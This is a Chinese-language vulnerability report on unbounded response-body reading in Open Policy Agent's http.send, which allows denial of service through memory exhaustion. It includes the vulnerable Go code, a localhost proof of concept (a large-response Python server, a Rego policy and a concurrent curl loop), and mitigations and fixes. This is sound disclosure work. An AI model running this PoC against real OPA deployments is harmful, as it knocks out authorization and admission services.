# Open Policy Agent http.send上游响应体无界读取导致拒绝服务漏洞

## 1. 漏洞标题

Open Policy Agent http.send上游响应体无界读取导致拒绝服务漏洞

## 2. 漏洞厂商

Open Policy Agent

## 3. 影响产品

Open Policy Agent（OPA）

项目地址：

```text
https://github.com/open-policy-agent/opa
```

## 4. 影响对象类型

应用软件 / 服务端策略引擎 / 云原生策略控制组件

## 5. 影响版本

经本地代码验证，`open-policy-agent/opa` 当前 `origin/main` 仍存在该问题：

```text
Open Policy Agent main 分支 commit d425213
```

本地仓库信息：

```text
commit: d425213
branch: main / origin/main
```

说明：由于本地源码快照为浅克隆/当前 main 快照，未直接确认完整历史版本边界。CNVD 提交时可先填写为“Open Policy Agent 当前 main 分支及包含相同 http.send 响应体无界读取逻辑的版本”。建议厂商最终确认精确受影响版本范围。

## 6. 漏洞类型

拒绝服务 / 资源消耗 / 内存耗尽

## 7. 漏洞等级建议

高危

## 8. CWE / CVSS

- CWE：`CWE-770 Allocation of Resources Without Limits or Throttling`
- CVSS 3.1：`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`
- CVSS 分数：6.5

说明：若部署环境允许低权限用户提交或触发包含 `http.send` 的策略评估，则攻击复杂度较低，主要影响可用性。若策略作者权限受严格控制，则实际风险取决于策略执行入口和上游 URL 可控程度。

## 9. 漏洞描述

Open Policy Agent（OPA）的 Rego 内置函数 `http.send` 在处理上游 HTTP 响应时存在响应体无界读取问题。OPA 会在 `formatHTTPResponseToAST()` 中使用 `io.ReadAll(resp.Body)` 将上游响应体完整读入内存，随后还会将响应体转换为 `raw_body` 字符串并写入 AST 结果对象。

当 OPA 策略调用 `http.send` 访问攻击者可控或异常的上游 HTTP 服务时，该上游服务可以返回超大响应体。OPA 会在没有响应体大小上限的情况下完整读取并保留该响应，导致 OPA 进程内存占用快速上升。在并发触发场景下，可能造成 OPA 评估阻塞、内存耗尽、OOM 或服务不可用，形成拒绝服务漏洞。

该问题已在公开 GitHub issue `open-policy-agent/opa#8480` 中被描述。截至验证时，该 issue 状态仍为 Open，项目状态为 Backlog，页面显示无关联分支或 Pull Request。本地 `origin/main` 仍存在同一无界读取代码。

## 10. 漏洞成因

OPA 的 `http.send` 执行链会调用 `formatHTTPResponseToAST()` 处理上游 HTTP 响应。当前代码直接读取完整响应体：

```go
// v1/topdown/http.go:1375-1379
func formatHTTPResponseToAST(resp *http.Response, forceJSONDecode, forceYAMLDecode bool) (ast.Value, []byte, error) {
    resultRawBody, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, nil, err
    }
```

随后在结果构造中将完整响应体转为字符串：

```go
// v1/topdown/http.go:1402-1407
result := make(map[string]any)
result["status"] = status
result["status_code"] = statusCode
result["body"] = resultBody
result["raw_body"] = string(body)
result["headers"] = getResponseHeaders(headers)
```

上述流程缺少以下防护：

1. 没有 `io.LimitReader` 或等效响应体大小限制；
2. 没有基于配置的 `max_response_body_bytes` 限制；
3. 没有在超限时提前终止读取并返回错误；
4. 读取后的 `[]byte` 还会转换为 `string`，进一步增加内存压力；
5. 在并发策略评估或缓存场景中，大响应体可能造成更高内存占用。

## 11. 攻击条件

攻击者需要满足以下条件之一：

1. 能够提交、修改或触发执行包含 `http.send` 的 Rego 策略；
2. 能够控制 `http.send` 请求的上游 URL；
3. 能够控制被 OPA 策略访问的上游 HTTP 服务响应内容；
4. 在多租户策略平台、CI/CD 策略校验、策略沙箱或用户可提交策略的场景中，低权限用户可利用该问题消耗 OPA 进程内存。

在默认只允许受信任管理员编写策略的环境中，攻击面会降低。但在允许用户上传策略、动态策略评估或策略访问外部服务的部署中，该问题可被远程触发。

## 12. PoC

以下 PoC 用于在授权测试环境中验证该问题。

### 12.1 启动返回超大响应体的 HTTP 服务

```bash
python3 - <<'PY'
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        size = int(parse_qs(urlparse(self.path).query).get('size', [104857600])[0])
        self.send_response(200)
        self.send_header('Content-Length', str(size))
        self.end_headers()
        self.wfile.write(b'A' * size)
    def log_message(self, *args):
        pass

socketserver.TCPServer.allow_reuse_address = True
socketserver.TCPServer(('127.0.0.1', 18080), H).serve_forever()
PY
```

### 12.2 准备 Rego 策略

保存为 `poc.rego`：

```rego
package test
import rego.v1

body_size := n if {
    url := sprintf("http://127.0.0.1:18080/?size=%d&t=%d", [input.size, input.t])
    resp := http.send({"method": "GET", "url": url, "timeout": "30s"})
    n := count(resp.raw_body)
}
```

### 12.3 启动 OPA

```bash
opa run --server poc.rego
```

### 12.4 发送并发请求触发内存消耗

```bash
for i in $(seq 1 5); do
  curl -s -o /dev/null http://localhost:8181/v1/data/test/body_size \
    -H 'Content-Type: application/json' \
    -d "{\"input\":{\"size\":104857600,\"t\":$i}}" &
done
wait
```

说明：`104857600` 为 100MB。实际验证时可根据测试环境内存大小调整响应体大小，例如 20MB、50MB、100MB。测试时应同时监控 OPA 进程 RSS 内存。

## 13. 触发过程

1. 攻击者准备或诱导执行包含 `http.send` 的 OPA 策略；
2. 策略访问攻击者可控的 HTTP 服务，或访问会返回超大响应体的上游服务；
3. 上游服务返回大体积 HTTP 响应；
4. OPA 在 `v1/topdown/http.go` 的 `formatHTTPResponseToAST()` 中执行 `io.ReadAll(resp.Body)`；
5. OPA 将完整响应体读入内存；
6. OPA 继续将响应体保存为 `raw_body` 字符串并构造 AST 结果；
7. 在单次大响应或并发多次请求下，OPA 进程内存快速上升；
8. 最终可能导致策略评估阻塞、进程 OOM 或 OPA 服务不可用。

## 14. 验证结果

2026-06-05 对本地 `repos/open-policy-agent_opa` 源码进行验证，结果如下：

```text
commit: d425213
branch: main / origin/main
```

确认存在以下代码：

- `v1/topdown/http.go:1375-1376`：`formatHTTPResponseToAST()` 中 `io.ReadAll(resp.Body)` 无上限读取上游响应体；
- `v1/topdown/http.go:1402-1407`：将完整响应体转为 `raw_body` 字符串写入结果对象；
- 本地未发现 `max_response_body_bytes`、`io.LimitReader` 或等效的 `http.send` 响应体大小限制逻辑。

公开验证信息：

- GitHub issue：`https://github.com/open-policy-agent/opa/issues/8480`
- issue 标题：`topdown/http: limit response body size in http.send`
- issue 状态：Open
- 项目状态：Backlog
- 页面显示：Development 下无关联 branches 或 pull requests

该 issue 正文同样指出 `http.send` 使用 `io.ReadAll(resp.Body)` 无大小上限，并记录本地测试中 100MB 响应和 5 并发请求会显著抬高 OPA RSS 内存占用。

## 15. 漏洞影响

成功利用该漏洞可能造成：

- OPA 进程内存占用显著升高；
- Rego 策略评估变慢或阻塞；
- OPA 服务响应退化；
- OPA 进程 OOM 或崩溃；
- 依赖 OPA 的鉴权、准入控制、策略决策链路不可用；
- 在 Kubernetes Admission、API Gateway、CI/CD 策略校验、多租户策略平台等场景中造成连带业务影响。

## 16. 临时解决方案

在官方修复发布前，建议采取以下临时缓解措施：

1. 禁止不受信任用户提交或修改包含 `http.send` 的策略；
2. 使用 OPA capabilities 或策略审计限制 `http.send` 的使用；
3. 对 `http.send` 可访问的上游地址设置 allowlist，避免访问攻击者可控服务；
4. 在上游 HTTP 服务或反向代理层限制响应体大小；
5. 为 OPA 进程设置合理的内存限制和重启策略；
6. 避免在多租户环境中允许用户控制 `http.send` 的 URL、timeout 或 cache 参数；
7. 对高风险策略启用额外审计，检查是否存在大响应读取风险。

## 17. 修复建议

建议厂商进行如下修复：

1. 为 `http.send` 增加响应体最大读取限制，例如 `max_response_body_bytes`；
2. 在 `formatHTTPResponseToAST()` 中使用 `io.LimitReader` 或等效机制；
3. 当响应体超过限制时，返回明确的内置函数错误，而不是继续读取；
4. 将默认响应体上限设置为安全值，并允许管理员配置；
5. 对 JSON/YAML 解码路径同样应用大小限制；
6. 避免在超大响应下同时保留 `[]byte` 与 `string` 多份副本；
7. 为并发大响应、缓存模式、force_json_decode、force_yaml_decode、raw_body 等路径添加回归测试；
8. 检查 inter-query cache 相关大小统计逻辑，确保大响应不会绕过缓存大小限制。
